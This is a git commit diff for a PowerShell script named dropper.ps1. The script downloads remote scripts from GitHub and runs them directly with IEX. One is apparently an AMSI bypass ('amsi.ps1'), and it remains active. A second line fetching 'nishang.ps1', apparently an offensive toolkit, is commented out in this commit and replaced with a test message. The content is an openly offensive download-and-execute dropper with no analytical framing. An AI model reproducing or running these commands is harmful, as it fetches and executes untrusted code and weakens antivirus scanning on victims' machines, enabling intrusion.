cbcbcf6587d18908717215d79a6fec606e033b1d
isap <63068320+IsaPeter@users.noreply.github.com>
2024-10-03 17:17:09 +0200

    Update dropper.ps1

--- dropper.ps1
+++ dropper.ps1
@@ -1,2 +1,3 @@
 (new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/IsaPeter/test1/refs/heads/master/amsi.ps1") | IEX
-(new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/IsaPeter/test1/refs/heads/master/nishang.ps1") | IEX
+#(new-object system.net.webclient).downloadstring("https://raw.githubusercontent.com/IsaPeter/test1/refs/heads/master/nishang.ps1") | IEX
+Write-Host "Testing"
